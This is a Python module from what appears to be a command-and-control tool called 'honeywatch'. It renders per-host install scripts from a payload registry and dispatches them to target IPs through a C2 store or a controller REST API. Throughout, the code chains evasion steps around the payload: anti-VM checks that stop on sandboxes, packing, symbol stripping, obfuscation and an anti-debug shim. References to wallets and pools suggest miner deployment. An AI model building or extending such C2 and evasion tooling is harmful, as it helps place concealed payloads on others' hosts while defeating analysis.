"""Deployment manifest builder and C2 dispatcher for honeywatch ops.

Builds per-host scripts from the payload registry, optionally chains evasion
payloads (pack, obfuscate, strip, anti-debug, anti-vm), and enqueues the
resulting operation on the C2 controller.
"""

from __future__ import annotations

import json
from typing import Any

from honeywatch.c2.store import C2Store
from honeywatch.models import DeploymentManifest, Operation, Payload, Target, WorkerTask
from honeywatch.payloads import get_payload, render_manifest_scripts
from honeywatch.payloads.scripts import (
    generate_operation_id,
    unsafe_variable_reasons,
    validate_variable_types,
    validate_variables,
)


def build_manifest(
    payload_id: str,
    targets: list[Target],
    variables: dict[str, Any],
    apply_evasion: list[str] | None = None,
    allow_unsafe_vars: bool = False,
    integrity_manifest: dict[str, str] | None = None,
    require_integrity: bool = False,
) -> DeploymentManifest:
    """Build a deployment manifest, optionally wrapping it in evasion payloads.

    ``apply_evasion`` is a list of evasion payload ids to prepend/append to the
    install flow, e.g. ``["upx", "symbol_strip"]``. ``allow_unsafe_vars``
    opts in to payload variable values that contain shell-metacharacters; by
    default such values are refused to protect the operator from accidental
    command injection via pasted wallets/pools/paths.

    ``integrity_manifest`` maps payload ids to a pinned ``sha256`` of their
    fetched release tarball; the rendered install script verifies the download
    against it. With ``require_integrity`` a payload that has no known hash is
    refused outright, closing the blind ``curl | tar | exec`` gap.
    """
    payload = get_payload(payload_id)
    missing = validate_variables(payload, variables)
    if missing:
        raise ValueError(
            f"payload {payload_id!r} missing required variables: {', '.join(missing)}"
        )
    type_errors = validate_variable_types(payload, variables)
    if type_errors:
        raise ValueError(
            f"payload {payload_id!r} has invalid variable values: "
            + "; ".join(type_errors)
        )
    if not allow_unsafe_vars:
        unsafe = unsafe_variable_reasons(variables)
        if unsafe:
            detail = ", ".join(f"{k} (contains {pat})" for k, pat in unsafe)
            raise ValueError(
                f"payload {payload_id!r} has unsafe variable values: {detail}. "
                "Remove the shell metacharacters, or pass --allow-unsafe-vars "
                "to accept them at your own risk."
            )

    # Integrity: prefer an operator-supplied sha256, then the manifest, then
    # (if require_integrity) refuse. The rendered script warns when unverified.
    from honeywatch.payloads.integrity import expected_for

    variables = dict(variables)
    pinned = variables.get("expected_sha256") or expected_for(payload_id, integrity_manifest)
    if require_integrity and not pinned:
        raise ValueError(
            f"payload {payload_id!r} has no pinned sha256 and --require-integrity "
            "is set. Add the artifact hash to your payloads integrity manifest "
            "(payloads/integrity.toml) or pass --var expected_sha256=..."
        )
    if pinned:
        variables.setdefault("expected_sha256", pinned)
    else:
        variables.setdefault("expected_sha256", "")

    # Fill in default install_dir based on payload id if not provided.
    variables = dict(variables)
    variables.setdefault("install_dir", f"/opt/honeywatch/{payload_id}")

    manifest = DeploymentManifest(
        payload=payload,
        targets=list(targets),
        variables=variables,
        evasion=list(apply_evasion or []),
    )
    scripts = render_manifest_scripts(manifest)

    if apply_evasion:
        scripts = _wrap_with_evasion(payload, scripts, apply_evasion, variables)

    manifest.per_host_scripts = scripts
    return manifest


# Where each known evasion payload sits in the install flow. ``prepend`` runs
# before the main payload (anti-vm bails early on sandboxes); ``append`` runs
# after install and operates on the installed artifacts (packers/strippers/
# obfuscators); ``final`` runs last (anti-debug shim). Any id not listed here
# defaults to ``append`` so a newly-added evasion payload is applied rather than
# silently dropped.
_EVASION_POSITION = {
    "anti_vm": "prepend",
    "upx": "append",
    "packers": "append",
    "symbol_strip": "append",
    "obfuscators": "append",
    "anti_debug": "final",
}


def _wrap_with_evasion(
    payload: Payload,
    scripts: dict[str, str],
    evasion_ids: list[str],
    variables: dict[str, Any],
) -> dict[str, str]:
    """Prepend evasion checks and append stripping/packing to each host script."""
    evasion_payloads = [get_payload(eid) for eid in evasion_ids]
    wrapped: dict[str, str] = {}
    for ip, script in scripts.items():
        parts: list[str] = []
        # prepend: anti-vm first so the rest of the script bails early on sandboxes.
        for ev in evasion_payloads:
            if _EVASION_POSITION.get(ev.id, "append") == "prepend":
                parts.append(ev.install_script)
                if ev.run_script:
                    parts.append(ev.run_script)
        # Main payload install.
        parts.append(script)
        # append: packers / strippers / obfuscators after install, operating on
        # the installed artifacts.
        for ev in evasion_payloads:
            if _EVASION_POSITION.get(ev.id, "append") == "append":
                rendered = _render_evasion_for_payload(ev, payload, variables)
                if rendered:
                    parts.append(rendered)
        # final: anti-debug shim last so operators can prepend LD_PRELOAD when running.
        for ev in evasion_payloads:
            if _EVASION_POSITION.get(ev.id, "append") == "final":
                parts.append(ev.install_script)
                if ev.run_script:
                    parts.append(ev.run_script)
        wrapped[ip] = "\n\n".join(parts)
    return wrapped


def _render_evasion_for_payload(
    ev: Payload, payload: Payload, variables: dict[str, Any]
) -> str:
    """Render an evasion payload against the main payload's installed artifacts.

    The evasion script's ``{{install_dir}}`` resolves to the evasion payload's
    own install dir (not the main payload's); ``{{input_file}}`` resolves to the
    main payload's installed primary artifact. Rendering goes through the same
    template engine as the main scripts so ``{{args|default(...)}}`` and other
    defaulted placeholders resolve consistently instead of being left literal.
    """
    if not payload.artifacts:
        return ""
    main_install_dir = variables.get("install_dir") or f"/opt/honeywatch/{payload.id}"
    target_file = f"{main_install_dir}/{payload.artifacts[0]}"
    ev_install_dir = (
        variables.get(f"{ev.id}_install_dir") or f"/opt/honeywatch/{ev.id}"
    )
    render_vars = dict(variables)
    render_vars["input_file"] = target_file
    render_vars["output_file"] = f"{target_file}.packed"
    render_vars["install_dir"] = ev_install_dir
    render_vars.setdefault("payload_install_dir", main_install_dir)
    script = ev.install_script
    if ev.run_script:
        script += "\n" + ev.run_script
    from honeywatch.payloads.scripts import _render_template

    return _render_template(script, render_vars)


def prepare_evasion_pipeline(evasion_spec: list[str] | str | None) -> list[str]:
    """Normalize an evasion spec into a list of valid payload ids."""
    if evasion_spec is None:
        return []
    if isinstance(evasion_spec, str):
        evasion_spec = [e.strip() for e in evasion_spec.split(",") if e.strip()]
    valid = [eid for eid in evasion_spec if _is_evasion_payload(eid)]
    return valid


def _is_evasion_payload(payload_id: str) -> bool:
    try:
        return get_payload(payload_id).category == "evasion"
    except KeyError:
        return False


def enqueue_operation(
    c2_store: C2Store,
    manifest: DeploymentManifest,
    operation_id: str | None = None,
) -> Operation:
    """Persist an operation and create per-target tasks in the C2 store."""
    payload = manifest.payload
    target_ips = [t.ip for t in manifest.targets]

    op = c2_store.create_operation(
        payload_id=payload.id,
        target_ips=target_ips,
        manifest={
            "payload_id": payload.id,
            "category": payload.category,
            "variables": manifest.variables,
            "evasion": list(manifest.evasion or []),
            "per_host_scripts": manifest.per_host_scripts,
        },
        operation_id=operation_id or generate_operation_id(),
    )

    scripts = manifest.per_host_scripts or render_manifest_scripts(manifest)
    for target in manifest.targets:
        script = scripts.get(target.ip, "")
        task = WorkerTask(
            id="",
            operation_id=op.id,
            payload_id=payload.id,
            category=payload.category,
            target=target,
            script=script,
            variables=dict(manifest.variables),
        )
        c2_store.create_task(task)

    # Mark running once tasks are queued.
    c2_store.update_operation_status(op.id, "running")
    return c2_store.get_operation(op.id) or op


def dispatch_to_controller(
    controller_url: str,
    manifest: DeploymentManifest,
    operation_id: str | None = None,
) -> dict[str, Any]:
    """Enqueue an operation via the controller REST API instead of direct DB."""
    import urllib.request

    url = controller_url.rstrip("/") + "/api/operations"
    data = json.dumps(
        {
            "payload_id": manifest.payload.id,
            "target_ips": [t.ip for t in manifest.targets],
            "manifest": {
                "variables": manifest.variables,
                "scripts": manifest.per_host_scripts,
                "evasion": list(manifest.evasion or []),
                "operation_id": operation_id,
            },
        }
    ).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=60) as resp:
        return json.loads(resp.read().decode("utf-8", "replace"))
